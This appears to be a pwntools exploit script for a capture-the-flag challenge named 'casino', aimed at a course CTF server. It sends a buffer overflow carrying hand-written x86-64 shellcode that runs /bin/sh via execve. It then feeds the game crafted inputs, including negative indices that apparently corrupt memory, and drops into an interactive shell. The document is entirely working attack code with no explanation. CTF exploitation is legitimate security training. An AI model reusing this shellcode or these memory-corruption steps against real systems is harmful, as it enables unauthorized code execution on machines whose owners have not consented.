from pwn import *
overflow=('a' * 32).encode()
key=6299920
sock=remote('edu-ctf.csie.org',10172)
#sock=process('./casino')
#pause()
#print(sock.pid)
context.arch='amd64'
sh = asm(
    '''
    mov rbx, 0x68732f6e69622f2f
    mov rbx, 0x68732f6e69622fff
    shr rbx, 0x8
    mov rax, 0xdeadbeefcafe1dea
    mov rbx, 0xdeadbeefcafe1dea
    mov rcx, 0xdeadbeefcafe1dea
    mov rdx, 0xdeadbeefcafe1dea
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
    ''')
sock.recvuntil(':')
sock.send(overflow+sh)
sock.recvuntil(':')
sock.sendline('20')
for i in range(6):
    sock.recvuntil(':')
    sock.sendline('1')
sock.recvuntil(']:')
sock.sendline('1')
sock.recvuntil(':')
sock.sendline('-43')
sock.recvuntil(':')
sock.sendline(str(key))
ans=['52','59','59','7','63','45']
for i in range(6):
    sock.recvuntil(':')
    sock.sendline(ans[i])
sock.recvuntil(']:')
sock.sendline('1')
sock.recvuntil(':')
sock.sendline('-42')
sock.recvuntil(':')
sock.sendline('0')
sock.interactive()
